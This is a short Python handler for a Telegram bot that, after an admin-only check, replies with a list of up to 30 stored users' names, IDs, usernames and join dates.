async def show_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """সব ইউজার দেখায় (শুধু অ্যাডমিন)"""
    if update.effective_chat.id != ADMIN_CHAT_ID:
        await update.message.reply_text("⛔ *Access Denied!*\nThis command is only for admin.", parse_mode='Markdown')
        return
    
    if not user_details:
        await update.message.reply_text("📭 No users have used the bot yet.")
        return
    
    message = "📋 *User List*\n\n"
    for uid, info in list(user_details.items())[:30]:
        message += f"👤 {info['name']}\n🆔 `{uid}`\n📛 @{info['username']}\n📅 {info['joined']}\n━━━━━━━━━\n"
    
    if len(user_details) > 30:
        message += f"\n... and {len(user_details) - 30} more users"
    
    await update.message.reply_text(message, parse_mode='Markdown')

